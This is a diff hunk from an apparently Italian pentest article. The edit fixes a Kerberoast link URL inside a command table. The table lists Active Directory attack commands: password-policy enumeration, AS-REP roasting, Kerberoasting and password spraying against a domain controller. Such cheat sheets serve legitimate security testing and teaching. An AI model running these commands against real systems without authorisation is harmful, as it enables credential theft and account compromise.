@@ -398,7 +398,7 @@ R: Limita l'accesso via firewall a IP admin autorizzati. Usa strong authenticati
 | Policy (AD)                                          | `crackmapexec smb [DC] -u user -p pass --pass-pol`              |
 | kpasswd                                              | `kpasswd user@REALM`                                            |
 | AS-REP Roast                                         | `GetNPUsers.py realm/ -usersfile users.txt -dc-ip [DC]`         |
-| [Kerberoast](https://hackita.it/articoli/kerberoast/) | `GetUserSPNs.py realm/user:pass -dc-ip [DC] -request`           |
+| [Kerberoast](https://hackita.it/articoli/kerberoasting/) | `GetUserSPNs.py realm/user:pass -dc-ip [DC] -request`           |
 | Spray                                                | `crackmapexec smb [DC] -u users.txt -p 'Pass!' --no-bruteforce` |
 
 ### Perché Porta 880 è rilevante nel 2026
